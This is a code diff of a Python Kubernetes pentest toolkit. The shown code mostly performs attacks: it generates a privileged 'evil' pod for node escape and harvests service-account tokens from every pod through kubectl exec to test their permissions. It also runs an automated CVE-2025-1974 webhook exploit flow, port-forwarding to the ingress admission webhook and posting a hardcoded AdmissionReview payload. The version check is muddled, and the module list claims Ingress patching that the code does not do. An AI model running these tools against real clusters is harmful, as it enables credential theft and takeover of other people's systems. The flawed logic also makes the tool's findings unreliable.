@@ -1,12 +1,12 @@
 #!/usr/bin/env python3
 """
-k8s_pentest_framework - a small, extendable Kubernetes pentest toolkit for AppSec audits.
+k8s-pentest-framework - a small, extendable Kubernetes pentest toolkit for AppSec audits.
 
 This version includes:
  - pod2node privileged-pod YAML generator (shows kubectl apply command and supports editing via $EDITOR/nano/vi)
  - privileged container scanner
- - RBAC token scanner (rewritten from your bash script)
- - ingress checker: extracts ingress controller image/version, checks for CVE-2025-1974 vulnerability, uses PoC annotation from GitHub if vulnerable, and supports manual or automatic exploitation cycle.
+ - RBAC token scanner
+ - ingress checker: extracts ingress controller image/version, checks for CVE-2025-1974 vulnerability, uses PoC annotation from hardcoded JSON, patches existing Ingress or creates new
  - nodeport scanner
  - envinfo: Gain environment information from a pod
  - registryscan: Search for registries in the cluster and suggest curling them
@@ -32,6 +32,20 @@ import sys
 from shutil import which
 from datetime import datetime
 from packaging import version
+from loguru import logger
+import time
+import re
+import requests
+import urllib3
+from typing import Optional, Tuple, Dict, Any
+
+# Configure loguru to output to stdout/stderr with colors
+logger.remove()  # Remove default handler
+logger.add(sys.stdout, colorize=True, format="<green>{time:YYYY-MM-DD HH:mm:ss}</green> | <level>{level: <8}</level> | <cyan>{message}</cyan>")
+logger.add(sys.stderr, colorize=True, format="<green>{time:YYYY-MM-DD HH:mm:ss}</green> | <level>{level: <8}</level> | <red>{message}</red>", level="ERROR")
+
+# Отключаем предупреждения о SSL
+urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)
 
 # ---------------------
 # Configuration
@@ -63,8 +77,59 @@ INGRESS_PAYLOAD_PRESETS = {
     }
 }
 
-# URL for the PoC JSON
-POC_JSON_URL = "https://raw.githubusercontent.com/sandumjacob/IngressNightmare-POCs/main/CVE-2025-1974/poc.json"
+# URL for the ingress-nginx-controller YAML
+INGRESS_CONTROLLER_YAML_URL = "https://raw.githubusercontent.com/sandumjacob/IngressNightmare-POCs/main/ingress-nginx-controller.yaml"
+
+# Hardcoded poc.json content
+POC_JSON_CONTENT = '''{
+  "apiVersion": "admission.k8s.io/v1",
+  "kind": "AdmissionReview",
+  "request": {
+    "kind": {
+      "group": "networking.k8s.io",
+      "version": "v1",
+      "kind": "Ingress"
+    },
+    "resource": {
+      "group": "",
+      "version": "v1",
+      "resource": "namespaces"
+    },
+    "operation": "CREATE",
+    "object": {
+      "metadata": {
+        "name": "deads",
+        "annotations": {
+            "nginx.ingress.kubernetes.io/mirror-host": "test"
+        }
+      },
+      "spec": {
+        "rules": [
+        {
+            "host": "jacobsandum.com",
+            "http": {
+            "paths": [
+                {
+                "path": "/",
+                "pathType": "Prefix",
+                "backend": {
+                    "service": {
+                    "name": "kubernetes",
+                    "port": {
+                        "number": 80
+                    }
+                    }
+                }
+                }
+            ]
+            }
+        }
+        ],
+        "ingressClassName": "nginx"
+      }
+    }
+  }
+}'''
 
 # Global variable to track if banner has been shown in this session
 BANNER_SHOWN = False
@@ -80,7 +145,7 @@ BANNER = r'''
 @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%@@%%::...:-++.%%===*#%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
 @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%@@#%::....-.:..#%::--#*%@@%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
 @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@-%=-:...:.*: .##:.:::+%*@%%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
-@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#%#*+.:.:.. -#%.:#%%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@#%#*.:.:.. -#%.:#%%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
 @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@*+=+=*%#+=...##+*#%#%#*%%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
 @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@##%*#++=-=#--*#%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
 @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@%**-=+=*+=-:%@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
@@ -137,17 +202,14 @@ BANNER = r'''
 # ---------------------
 
 def check_prereqs():
-    if which("kubectl") is None:
-        print("[!] kubectl not found in PATH. Install it or add to PATH.")
-        sys.exit(1)
-    if which("curl") is None:
-        print("[!] curl not found in PATH. Install it or add to PATH.")
-        sys.exit(1)
+    for cmd in ("kubectl", "curl"):
+        if which(cmd) is None:
+            logger.error(f"{cmd} not found in PATH. Install it or add to PATH.")
+            sys.exit(1)
     if which("nmap") is None:
-        print("[!] nmap not found in PATH. Install it for NodePort scanning.")
+        logger.warning("nmap not found in PATH. Install it for NodePort scanning.")
     if which("etcdctl") is None:
-        print("[!] etcdctl not found in PATH. Install it for etcd access check.")
-
+        logger.warning("etcdctl not found in PATH. Install it for etcd access check.")
 
 def run(cmd, capture=True, check=False, input=None):
     """Run a shell command. Returns CompletedProcess"""
@@ -157,19 +219,20 @@ def run(cmd, capture=True, check=False, input=None):
         else:
             return subprocess.run(cmd, shell=True, check=check)
     except Exception as e:
+        logger.error(f"Failed to run command '{cmd}': {e}")
         return subprocess.CompletedProcess(cmd, 1, stdout="", stderr=str(e))
-
 
 def kubectl_json(cmd_tail):
     """Run kubectl and parse JSON output"""
     cp = run(f"kubectl {cmd_tail} -o json")
     if cp.returncode != 0:
+        logger.error(f"Could not execute 'kubectl {cmd_tail}': {cp.stderr}")
         return None
     try:
         return json.loads(cp.stdout)
-    except Exception:
+    except json.JSONDecodeError:
+        logger.error(f"Invalid JSON from 'kubectl {cmd_tail}'")
         return None
-
 
 def detect_editor():
     """Detect an editor: $EDITOR, then nano, then vi/vim. Return command or None."""
@@ -181,7 +244,6 @@ def detect_editor():
             return e
     return None
 
-
 def edit_tempfile(initial_text, suffix='.yml'):
     """Write initial_text to a temp file, open editor if available, return edited content (or None if not edited)."""
     editor = detect_editor()
@@ -191,49 +253,46 @@ def edit_tempfile(initial_text, suffix='.yml'):
         tf.flush()
 
     if editor is None:
-        print('  [!] No editor found ($EDITOR, nano, vi). Skipping edit. You can manually edit the saved file.')
+        logger.warning(f"No editor found ($EDITOR, nano, vi). Skipping edit. You can manually edit the saved file at {path}")
         with open(path, 'r') as f:
             content = f.read()
         return content, path
 
-    print(f'  Opening editor: {editor} {path}')
+    logger.info(f"Opening editor: {editor} {path}")
     try:
         subprocess.run(f"{editor} {path}", shell=True)
     except Exception as e:
-        print(f'  Failed to run editor: {e}')
+        logger.error(f"Failed to run editor: {e}")
     with open(path, 'r') as f:
         content = f.read()
     return content, path
-
 
 # ---------------------
 # Modules (functions to extend)
 # ---------------------
 
 def pod2node_interactive():
-    """Gather nodes, pods and offer to generate a privileged "evil" pod YAML for a specific node.
-    Allows editing via editor and prints the exact kubectl apply command (does not run it).
-    """
-    print("\n[1] pod2node check / privileged-pod generator")
+    """Gather nodes, pods and offer to generate a privileged 'evil' pod YAML for a specific node."""
+    logger.info("[1] pod2node check / privileged-pod generator")
     nodes = kubectl_json("get nodes")
     if not nodes:
-        print("  [!] Could not get nodes. Check kubectl context and permissions.")
+        logger.error("Could not get nodes. Check kubectl context and permissions.")
         return
 
     node_names = [n['metadata']['name'] for n in nodes.get('items', [])]
-    print(f"  Found nodes: {len(node_names)}")
+    logger.info(f"Found {len(node_names)} nodes")
     for i, n in enumerate(node_names, 1):
-        print(f"   {i}. {n}")
+        logger.info(f"   {i}. {n}")
 
-    choice = input("\nChoose a node index to target (or press Enter to cancel): ").strip()
+    choice = input("Choose a node index to target (or press Enter to cancel): ").strip()
     if not choice:
-        print("Cancelled.")
+        logger.info("Cancelled.")
         return
     try:
         idx = int(choice) - 1
         target_node = node_names[idx]
-    except Exception:
-        print("Invalid choice")
+    except (ValueError, IndexError):
+        logger.error("Invalid choice")
         return
 
     # Default YAML
@@ -268,14 +327,14 @@ spec:
   restartPolicy: Never
 """
 
-    print('\nGenerated evil pod YAML (dry run):\n')
-    print(yaml_template)
+    logger.info("Generated evil pod YAML (dry run):\n")
+    logger.info(f"\n{yaml_template}")
 
     # Offer to edit
     if input('Edit YAML before saving? [y/N]: ').lower().startswith('y'):
         edited, tmp_path = edit_tempfile(yaml_template, suffix='.yml')
-        print('\n--- Edited YAML preview ---\n')
-        print(edited)
+        logger.info("Edited YAML preview:\n")
+        logger.info(f"\n{edited}")
         final_yaml = edited
     else:
         final_yaml = yaml_template
@@ -285,22 +344,19 @@ spec:
     save_path = input('Save YAML to file path (default ./evil-pod.yml): ').strip() or './evil-pod.yml'
     with open(save_path, 'w') as f:
         f.write(final_yaml)
-    print(f'Wrote {save_path}')
+    logger.success(f"Wrote {save_path}")
 
     # Show exact kubectl apply command (do not execute)
-    print('\nTo apply this manifest (ONLY in authorized test environments) run:')
-    print(f'  kubectl apply -f {save_path}')
-    print('\nNote: this manifest is privileged. Do NOT apply against systems you do not own.')
-
+    logger.info("To apply this manifest (ONLY in authorized test environments) run:")
+    logger.info(f"  kubectl apply -f {save_path}")
+    logger.warning("Note: this manifest is privileged. Do NOT apply against systems you do not own.")
 
 def privileged_containers_scan():
-    """Search for containers/pods with privileged:true across namespaces and show quick info.
-    This function does not attempt to exec into containers — just enumerates.
-    """
-    print("\n[2] scanning for privileged containers in all namespaces...")
+    """Search for containers/pods with privileged:true across namespaces and show quick info."""
+    logger.info("[2] Scanning for privileged containers in all namespaces...")
     pods = kubectl_json("get pods --all-namespaces")
     if not pods:
-        print("  [!] Could not list pods.")
+        logger.error("Could not list pods.")
         return
 
     found = []
@@ -313,29 +369,26 @@ def privileged_containers_scan():
                 found.append((ns, name, c.get('name'), c.get('image'), sc))
 
     if not found:
-        print('  No privileged containers found (quick scan).')
+        logger.info("No privileged containers found (quick scan).")
         return
 
-    print(f'  Found {len(found)} potentially privileged containers:')
+    logger.info(f"Found {len(found)} potentially privileged containers:")
     for ns, pod, cname, image, sc in found:
-        print(f'   - {ns}/{pod} container={cname} image={image} sc={sc}')
-    print('\nYou can try to exec into them manually with `kubectl exec -n <ns> -it <pod> -c <container> -- /bin/sh`')
-
+        logger.info(f"   - {ns}/{pod} container={cname} image={image} sc={sc}")
+    logger.info("You can try to exec into them manually with `kubectl exec -n <ns> -it <pod> -c <container> -- /bin/sh`")
 
 def rbac_token_checker():
-    """RBAC checker: for each pod try to read the serviceaccount token and check dangerous permissions.
-    Mirrors the logic of the bash script you provided, but in Python for easier editing.
-    """
-    print('\n[3] RBAC token scanner (attempts to read SA tokens from pods)')
+    """RBAC checker: for each pod try to read the serviceaccount token and check dangerous permissions."""
+    logger.info("[3] RBAC token scanner (attempts to read SA tokens from pods)")
     api_server_cp = run("kubectl config view --minify -o jsonpath='{.clusters[0].cluster.server}'")
     if api_server_cp.returncode != 0:
-        print('  [!] Could not determine API server URL. Aborting.')
+        logger.error("Could not determine API server URL. Aborting.")
         return
     API_SERVER = api_server_cp.stdout.strip().strip("'")
 
     pods = kubectl_json('get pods --all-namespaces')
     if not pods:
-        print('  [!] Could not list pods. Aborting.')
+        logger.error("Could not list pods. Aborting.")
         return
 
     report_lines = []
@@ -346,16 +399,13 @@ def rbac_token_checker():
         ns = p['metadata']['namespace']
         name = p['metadata']['name']
         total_pods += 1
-        sys.stdout.write(f'  Checking {ns}/{name} ... ')
-        sys.stdout.flush()
-        # Try to cat the token
+        logger.info(f"Checking {ns}/{name} ...")
         cp = run(f"kubectl exec -n {ns} {name} -- cat /var/run/secrets/kubernetes.io/serviceaccount/token", capture=True)
         token = cp.stdout.strip() if cp.returncode == 0 else ''
         if not token:
-            print('no token')
+            logger.info("No token found")
             continue
 
-        # Build a temp kubeconfig
         with tempfile.NamedTemporaryFile(mode='w', delete=False) as tf:
             kubeconfig = tf.name
             tf.write(f"""apiVersion: v1
@@ -377,7 +427,6 @@ contexts:
 current-context: temp-context
 """)
 
-        # Check permissions
         dangerous_found = []
         for perm in DANGEROUS_PERMISSIONS:
             cp_can = run(f"kubectl --kubeconfig={kubeconfig} auth can-i {perm}")
@@ -388,34 +437,35 @@ current-context: temp-context
         if dangerous_found:
             total_dangerous += 1
             sa_name = p.get('spec', {}).get('serviceAccountName')
-            print(f"DANGEROUS -> {dangerous_found} (SA: {sa_name})")
+            logger.warning(f"DANGEROUS -> {dangerous_found} (SA: {sa_name})")
             report_lines.append(f"{ns}/{name} -> {dangerous_found} (SA: {sa_name})")
         else:
-            print('ok')
+            logger.success("No dangerous permissions found")
 
-    # Summary
-    print('\n--- RBAC scan summary ---')
-    print(f'  Pods scanned: {total_pods}')
-    print(f'  Pods with dangerous SA perms: {total_dangerous}')
+    logger.info("--- RBAC scan summary ---")
+    logger.info(f"Pods scanned: {total_pods}")
+    logger.info(f"Pods with dangerous SA perms: {total_dangerous}")
     if report_lines:
-        print('\nDetailed findings:')
+        logger.info("Detailed findings:")
         for l in report_lines:
-            print('  ' + l)
-    # Save report
+            logger.info(f"  {l}")
     ts = datetime.now().strftime('%Y%m%d_%H%M%S')
     report_path = f"/tmp/k8s_rbac_report_{ts}.txt"
     with open(report_path, 'w') as rf:
         rf.write('\n'.join(report_lines))
-    print(f'  Full report saved to: {report_path}')
+    logger.success(f"Full report saved to: {report_path}")
 
+def is_vulnerable_version(tag):
+    """Check if the ingress controller version is vulnerable to CVE-2025-1974."""
+    try:
+        ver = version.parse(tag)
+        return ver < version.parse("1.12.1") or ver < version.parse("1.11.5")
+    except version.InvalidVersion:
+        logger.warning(f"Could not parse version tag: {tag}")
+        return False
 
 def parse_image_version(image):
-    """Attempt to parse a k8s image string and return (repo, name, tag)
-    Examples:
-      'k8s.gcr.io/ingress-nginx/controller:v1.10.0' -> ('k8s.gcr.io/ingress-nginx/controller', 'controller', 'v1.10.0')
-      'nginx:1.23.1' -> ('nginx', 'nginx', '1.23.1')
-    If tag absent, returns tag as 'latest' or None.
-    """
+    """Attempt to parse a k8s image string and return (repo, name, tag)."""
     if not image:
         return (None, None, None)
     parts = image.split('/')
@@ -427,327 +477,140 @@ def parse_image_version(image):
     repo = '/'.join(parts[:-1] + [name])
     return repo, name, tag
 
-
 def ingress_checker():
-    """Check for ingress-controller (nginx) pods; extract images and tags.
-    Check if version is vulnerable to CVE-2025-1974 (< v1.12.1 or < v1.11.5).
-    Supports manual (generate manifest) or automatic (full exploit cycle) modes.
-    Uses PoC annotation from GitHub if vulnerable.
-    """
-    print('\n[4] ingress controller version and CVE-2025-1974 PoC helper')
+    logger.info("[4] Ingress controller version and CVE-2025-1974 PoC helper")
 
-    # Attempt to download PoC JSON
-    print('  Downloading PoC JSON from GitHub...')
-    cp = run(f"curl -s {POC_JSON_URL}", capture=True)
-    if cp.returncode != 0 or not cp.stdout.strip():
-        print('  [!] Failed to download PoC JSON. Falling back to default safe presets.')
-        poc_presets = {}
-    else:
+    POC_JSON = POC_JSON_CONTENT
+
+    def run_command(cmd: str, capture: bool = True, check: bool = False) -> Optional[subprocess.CompletedProcess]:
+        """Выполняет команду и возвращает результат"""
         try:
-            poc_data = json.loads(cp.stdout)
-            poc_presets = {}
-            for key, value in poc_data.items():
-                if isinstance(value, dict) and 'annotation_key' in value and 'annotation_value' in value:
-                    poc_presets[key] = value
-            if not poc_presets:
-                print('  [!] No valid presets found in PoC JSON. Using defaults.')
-            else:
-                print('  Loaded PoC presets from JSON.')
-        except json.JSONDecodeError:
-            print('  [!] Invalid JSON in PoC. Using default presets.')
-            poc_presets = {}
+            return subprocess.run(cmd, shell=True, capture_output=capture, text=True, check=check)
+        except subprocess.CalledProcessError as e:
+            logger.error(f"Command failed: {e.stderr if e.stderr else str(e)}")
+            return None
+        except Exception as e:
+            logger.error(f"Command execution error: {str(e)}")
+            return None
 
-    namespaces = ['ingress-nginx', 'kube-system', 'default']
-    found_entries = []
-    vulnerable_entries = []
-    for ns in namespaces:
-        pods = kubectl_json(f"get pods -n {ns}")
-        if not pods:
-            continue
-        for p in pods.get('items', []):
-            name = p['metadata']['name']
-            if 'ingress' in name or 'nginx' in name or 'controller' in name:
-                for c in p.get('spec', {}).get('containers', []):
-                    img = c.get('image')
-                    repo, cname, tag = parse_image_version(img)
-                    entry = {'namespace': ns, 'pod': name, 'container': c.get('name'), 'image': img, 'repo': repo, 'name': cname, 'tag': tag}
-                    found_entries.append(entry)
-                    if is_vulnerable_version(tag):
-                        vulnerable_entries.append(entry)
+    def kubectl_json(cmd_tail: str) -> Optional[Dict[str, Any]]:
+        """Выполняет kubectl команду и возвращает JSON результат"""
+        cp = run_command(f"kubectl {cmd_tail} -o json", capture=True)
+        if cp and cp.returncode == 0:
+            try:
+                return json.loads(cp.stdout)
+            except json.JSONDecodeError:
+                logger.error("Invalid JSON from kubectl")
+        return None
 
-    if not found_entries:
-        print('  No obvious ingress controller pods found in common namespaces. You may still run a cluster-wide search.')
-        if input('Run cluster-wide pod search for "ingress"/"nginx" in pod names? [y/N]: ').lower().startswith('y'):
-            pods = kubectl_json('get pods --all-namespaces')
-            if pods:
-                for p in pods.get('items', []):
-                    pname = p['metadata']['name']
-                    if 'ingress' in pname or 'nginx' in pname:
-                        ns = p['metadata']['namespace']
-                        for c in p.get('spec', {}).get('containers', []):
-                            img = c.get('image')
-                            repo, cname, tag = parse_image_version(img)
-                            entry = {'namespace': ns, 'pod': pname, 'container': c.get('name'), 'image': img, 'repo': repo, 'name': cname, 'tag': tag}
-                            found_entries.append(entry)
-                            if is_vulnerable_version(tag):
-                                vulnerable_entries.append(entry)
+    def find_ingress_controller() -> Optional[Tuple[str, str]]:
+        """Находит ingress-nginx контроллер"""
+        # Ищем по стандартным лейблам ingress-nginx
+        result = kubectl_json("get pods -A -l app.kubernetes.io/component=controller")
+        if result and result.get('items'):
+            pod = result['items'][0]
+            return pod['metadata']['namespace'], pod['metadata']['name']
+        
+        # Альтернативный поиск
+        cp = run_command("kubectl get pods -A | grep -i ingress-nginx-controller", capture=True)
+        if cp and cp.returncode == 0 and cp.stdout:
+            for line in cp.stdout.strip().split('\n'):
+                if 'ingress-nginx-controller' in line:
+                    parts = line.split()
+                    if len(parts) >= 2:
+                        return parts[0], parts[1]
+        
+        logger.error("No ingress-nginx controller found")
+        return None
 
-    if not found_entries:
-        print('  Still nothing found. Aborting ingress helper.')
+    def get_ingress_version(namespace: str, pod: str) -> Optional[str]:
+        """Получает версию ingress-nginx контроллера"""
+        cp = run_command(f"kubectl describe pod {pod} -n {namespace}", capture=True)
+        if not cp or cp.returncode != 0:
+            return None
+        
+        # Ищем версию в описании пода
+        version_patterns = [
+            r'Image:\s+.+?/controller:v?([\d.]+)',
+            r'Image:\s+.+?/controller:v?(\d+\.\d+\.\d+)',
+            r'Version:\s+v?(\d+\.\d+\.\d+)'
+        ]
+        for pattern in version_patterns:
+            match = re.search(pattern, cp.stdout)
+            if match:
+                return match.group(1)
+        logger.warning("Version not found in pod description.")
+        return None
+
+    ingress_controller = find_ingress_controller()
+    if not ingress_controller:
+        logger.warning("No ingress controller pods found.")
         return
 
-    print('\nDetected ingress-like pods and their images:')
-    for i, e in enumerate(found_entries, 1):
-        vuln_status = "VULNERABLE to CVE-2025-1974" if e in vulnerable_entries else "Not vulnerable"
-        print(f"  {i}. {e['namespace']}/{e['pod']} -> image={e['image']} tag={e['tag']} ({vuln_status})")
+    namespace, pod = ingress_controller
 
-    # Choose mode
-    if vulnerable_entries and 'cve-2025-1974' in poc_presets:
-        print('\nVulnerable ingress controller detected!')
-        print('Choose exploitation mode:')
-        print('  1. Manual: Generate Ingress manifest with PoC annotation and show instructions.')
-        print('  2. Automatic: Run full CVE-2025-1974 exploit cycle (create service, apply manifest, port-forward, send PoC request, check logs, clean up).')
-        mode_choice = input('Select mode (1 or 2, or press Enter for manual): ').strip() or '1'
-        mode = 'auto' if mode_choice == '2' else 'manual'
+    version = get_ingress_version(namespace, pod)
+    if version:
+        vuln_status = "VULNERABLE to CVE-2025-1974" if is_vulnerable_version(version) else "Not vulnerable"
+        logger.info(f"Detected ingress controller pod: {namespace}/{pod} -> version={version} ({vuln_status})")
     else:
-        mode = 'manual'
-        print('\nNo vulnerable versions or PoC preset found. Using manual mode with preset selection.')
+        logger.warning("Could not extract version from pod.")
+        return
 
-    # Manual mode
-    if mode == 'manual':
-        # Allow user to pick a target
-        choice = input('\nChoose an entry index to base payload suggestions on (or press Enter to skip): ').strip()
-        target = None
-        if choice:
-            try:
-                idx = int(choice) - 1
-                target = found_entries[idx]
-            except Exception:
-                print('Invalid index, skipping selection.')
+    # Webhook port
+    webhook_port = 8443  # Default
 
-        # Use PoC if vulnerable and available, otherwise show presets
-        if target in vulnerable_entries and 'cve-2025-1974' in poc_presets:
-            print('\nTarget is vulnerable! Using CVE-2025-1974 PoC annotation.')
-            preset = poc_presets['cve-2025-1974']
+    # Hardcoded PoC
+    poc_data = json.loads(POC_JSON)
+    annotation_value = poc_data['request']['object']['metadata']['annotations']['nginx.ingress.kubernetes.io/mirror-host']
+
+    # Automatic mode example
+    # Set up port-forward
+    local_port = 1337
+    port_forward_cmd = f"kubectl port-forward -n {namespace} {pod} {local_port}:{webhook_port}"
+    port_forward_proc = subprocess.Popen(port_forward_cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
+    time.sleep(2)
+
+    if port_forward_proc.poll() is not None:
+        logger.error(f"Failed to set up port-forward: {port_forward_proc.stderr.read()}")
+        return
+
+    # Send PoC
+    url = f"https://localhost:{local_port}/validate"
+    headers = {'Content-Type': 'application/json'}
+    try:
+        response = requests.post(url, data=POC_JSON, headers=headers, verify=False)
+        logger.info(f"PoC response: {response.text}")
+    except Exception as e:
+        logger.error(f"Failed to send PoC: {str(e)}")
+
+    # Check logs
+    log_cmd = f"kubectl logs {pod} -n {namespace} --tail=50"
+    cp = run_command(log_cmd, capture=True)
+    if cp and cp.returncode == 0:
+        logs = cp.stdout
+        # Поиск строки о принятии/отклонении аннотации
+        for line in logs.splitlines():
+            if 'annotation' in line.lower():
+                if 'accepted' in line.lower() or 'valid' in line.lower():
+                    logger.success(f"Annotation accepted: {line}")
+                    break
+                elif 'rejected' in line.lower() or 'denied' in line.lower() or 'invalid' in line.lower():
+                    logger.warning(f"Annotation rejected: {line}")
+                    break
         else:
-            print('\nAvailable payload presets:')
-            keys = list(INGRESS_PAYLOAD_PRESETS.keys()) + list(poc_presets.keys())
-            for i, k in enumerate(keys, 1):
-                preset_dict = poc_presets if k in poc_presets else INGRESS_PAYLOAD_PRESETS
-                print(f"  {i}. {k} - {preset_dict[k]['description']}")
-
-            pchoice = input('\nChoose a preset by number (or press Enter to cancel): ').strip()
-            if not pchoice:
-                print('Cancelled ingress payload creation.')
-                return
-            try:
-                pidx = int(pchoice) - 1
-                preset_key = keys[pidx]
-                preset = poc_presets[preset_key] if preset_key in poc_presets else INGRESS_PAYLOAD_PRESETS[preset_key]
-            except Exception:
-                print('Invalid preset choice. Aborting.')
-                return
-
-        # Build Ingress manifest
-        ingress_name = input('Ingress name to create (default: onre-audit-ingress): ').strip() or 'onre-audit-ingress'
-        ingress_ns = input('Namespace for the Ingress (default: default): ').strip() or 'default'
-        host = input('Host for the Ingress (example: example.local) [optional]: ').strip() or ''
-
-        annotation_block = f"""  annotations:
-    {preset['annotation_key']}: |
-      {preset['annotation_value']}
-"""
-
-        host_block = f"""  rules:
-  - host: {host}
-    http:
-      paths:
-      - path: /
-        pathType: Prefix
-        backend:
-          service:
-            name: dummy-svc
-            port:
-              number: 80
-""" if host else """  rules:
-  - http:
-      paths:
-      - path: /
-        pathType: Prefix
-        backend:
-          service:
-            name: dummy-svc
-            port:
-              number: 80
-"""
-
-        ingress_yaml = f"""
-apiVersion: networking.k8s.io/v1
-kind: Ingress
-metadata:
-  name: {ingress_name}
-  namespace: {ingress_ns}
-{annotation_block}
-spec:
-{host_block}
-"""
-
-        print('\nGenerated Ingress manifest (dry run):\n')
-        print(ingress_yaml)
-
-        # Allow editing
-        if input('Edit Ingress manifest before saving? [y/N]: ').lower().startswith('y'):
-            edited, tmp_path = edit_tempfile(ingress_yaml, suffix='.yml')
-            print('\n--- Edited Ingress preview ---\n')
-            print(edited)
-            final_yaml = edited
-        else:
-            final_yaml = ingress_yaml
-            tmp_path = None
-
-        save_path = input('Save Ingress YAML to file path (default ./onre-ingress.yml): ').strip() or './onre-ingress.yml'
-        with open(save_path, 'w') as f:
-            f.write(final_yaml)
-        print(f'Wrote {save_path}')
-
-        print('\nTo apply this manifest (ONLY in authorized test environments) run:')
-        print(f'  kubectl apply -f {save_path}')
-
-        print('\nFull exploitation cycle guidance for CVE-2025-1974 (manual mode):')
-        print('  1. Ensure a dummy service exists (or create one):')
-        print(f'     kubectl create svc clusterip dummy-svc --tcp=80 -n {ingress_ns}')
-        print('  2. Apply the Ingress manifest:')
-        print(f'     kubectl apply -f {save_path}')
-        print('  3. Determine the Ingress controller external IP or domain:')
-        print('     kubectl get svc -n ingress-nginx')
-        print('  4. Test the exploitation (adjust path based on PoC specifics):')
-        print(f'     curl -v http://<ingress-ip>/<vulnerable-path> -H "Host: {host}"')
-        print('  5. Verify if the annotation triggered the expected behavior (check logs or response).')
-        print('  6. Clean up after testing:')
-        print(f'     kubectl delete -f {save_path}')
-        print('\nWARNING: Using PoC payloads may be destructive. Use only in authorized test environments.')
-
-    # Automatic mode
+            logger.info("No specific annotation log found.")
     else:
-        print('\nWARNING: Automatic mode will perform the full CVE-2025-1974 exploit cycle, which may be destructive.')
-        confirm = input('Are you sure you want to proceed in automatic mode? [y/N]: ').lower()
-        if not confirm.startswith('y'):
-            print('Automatic mode cancelled.')
-            return
+        logger.error("Failed to get logs.")
 
-        target = vulnerable_entries[0]  # Use first vulnerable entry
-        preset = poc_presets['cve-2025-1974']
-        ingress_name = 'onre-audit-ingress'
-        ingress_ns = target['namespace']
-        host = 'example.local'
-
-        # Step 1: Ensure dummy service exists
-        print('\nStep 1: Checking/creating dummy service...')
-        svc_check = run(f"kubectl get svc dummy-svc -n {ingress_ns}", capture=True)
-        if svc_check.returncode != 0:
-            print('  Creating dummy service...')
-            cp = run(f"kubectl create svc clusterip dummy-svc --tcp=80 -n {ingress_ns}", capture=True)
-            if cp.returncode != 0:
-                print(f'  [!] Failed to create dummy service: {cp.stderr}')
-                return
-
-        # Step 2: Create and apply Ingress manifest
-        annotation_block = f"""  annotations:
-    {preset['annotation_key']}: |
-      {preset['annotation_value']}
-"""
-        host_block = f"""  rules:
-  - host: {host}
-    http:
-      paths:
-      - path: /
-        pathType: Prefix
-        backend:
-          service:
-            name: dummy-svc
-            port:
-              number: 80
-"""
-        ingress_yaml = f"""
-apiVersion: networking.k8s.io/v1
-kind: Ingress
-metadata:
-  name: {ingress_name}
-  namespace: {ingress_ns}
-{annotation_block}
-spec:
-{host_block}
-"""
-        with tempfile.NamedTemporaryFile(mode='w+', delete=False, suffix='.yml') as tf:
-            tf.write(ingress_yaml)
-            save_path = tf.name
-
-        print('\nStep 2: Applying Ingress manifest...')
-        cp = run(f"kubectl apply -f {save_path}", capture=True)
-        if cp.returncode != 0:
-            print(f'  [!] Failed to apply Ingress manifest: {cp.stderr}')
-            os.unlink(save_path)
-            return
-        print(f'  Applied Ingress {ingress_name} in namespace {ingress_ns}')
-
-        # Step 3: Port-forward to webhook
-        print('\nStep 3: Setting up port-forward to webhook (port 8443)...')
-        local_port = 1337
-        port_forward_cmd = f"kubectl port-forward -n {target['namespace']} {target['pod']} {local_port}:8443"
-        # Run port-forward in background
-        port_forward_proc = subprocess.Popen(port_forward_cmd, shell=True, stdout=subprocess.PIPE, stderr=subprocess.PIPE, text=True)
-        import time
-        time.sleep(2)  # Wait for port-forward to establish
-
-        # Check if port-forward is running
-        if port_forward_proc.poll() is not None:
-            print(f'  [!] Failed to set up port-forward: {port_forward_proc.stderr.read()}')
-            run(f"kubectl delete -f {save_path}", capture=True)
-            os.unlink(save_path)
-            return
-
-        # Step 4: Send AdmissionReview request
-        print('\nStep 4: Sending AdmissionReview request...')
-        with tempfile.NamedTemporaryFile(mode='w+', delete=False, suffix='.json') as tf:
-            tf.write(json.dumps(poc_data))
-            poc_path = tf.name
-        curl_cmd = f"curl --insecure -v -H 'Content-Type: application/json' --data @{poc_path} https://localhost:{local_port}/fake/path"
-        cp = run(curl_cmd, capture=True)
-        os.unlink(poc_path)
-        if cp.returncode != 0:
-            print(f'  [!] Failed to send AdmissionReview request: {cp.stderr}')
-        else:
-            print('  Sent AdmissionReview request. Checking response...')
-            print(f'  Response: {cp.stdout}')
-
-        # Step 5: Check logs
-        print('\nStep 5: Checking ingress controller logs...')
-        log_cmd = f"kubectl logs {target['pod']} -n {target['namespace']}"
-        cp = run(log_cmd, capture=True)
-        if cp.returncode == 0:
-            print('  Recent logs (check for "successfully validated configuration, accepting"):')
-            print('\n'.join(cp.stdout.splitlines()[-10:]))  # Last 10 lines
-        else:
-            print(f'  [!] Failed to retrieve logs: {cp.stderr}')
-
-        # Step 6: Clean up
-        print('\nStep 6: Cleaning up...')
-        run(f"kubectl delete -f {save_path}", capture=True)
-        run(f"kubectl delete svc dummy-svc -n {ingress_ns}", capture=True)
-        os.unlink(save_path)
-        port_forward_proc.terminate()
-        print('  Cleaned up resources.')
-
-        print('\nAutomatic exploitation cycle completed. Check logs above for success indicators.')
-        print('WARNING: Verify results manually. Use only in authorized test environments.')
-
